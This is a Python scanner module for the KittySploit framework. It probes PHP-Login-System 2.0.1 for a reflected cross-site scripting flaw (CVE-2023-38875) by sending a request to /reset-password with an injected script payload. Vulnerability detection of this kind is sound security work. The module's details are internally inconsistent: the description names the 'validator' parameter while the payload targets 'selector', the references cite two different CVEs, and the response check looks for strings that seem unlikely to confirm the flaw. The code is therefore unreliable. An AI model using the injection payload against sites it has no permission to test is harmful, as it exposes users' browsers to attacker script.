#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""msaad1999's PHP-Login-System 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHP Login System 2.0.1 - Cross-Site Scripting Detection',
        'description': "msaad1999's PHP-Login-System 2.0.1 contains a reflected cross-site scripting caused by unsanitized input in 'validator' parameter in /reset-password, letting remote attackers execute arbitrary JavaScript in a user's browser, exploit requires attacker to craft malicious URL",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'php-login-system'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-38876',
            'https://github.com/dub-flow/vulnerability-research/tree/main/CVE-2023-38875',
        ],
        'cve': 'CVE-2023-38875',
    }

    def run(self):
        r = self.http_request(method="GET", path='/reset-password/?selector=test"><script>alert(document.domain)</script>&validator=test', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('test\\',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="PHP Login System 2.0.1 - Cross-Site Scripting detected",
                path='/reset-password/?selector=test"><script>alert(document.domain)</script>&validator=test',
            )
            return True
        return False

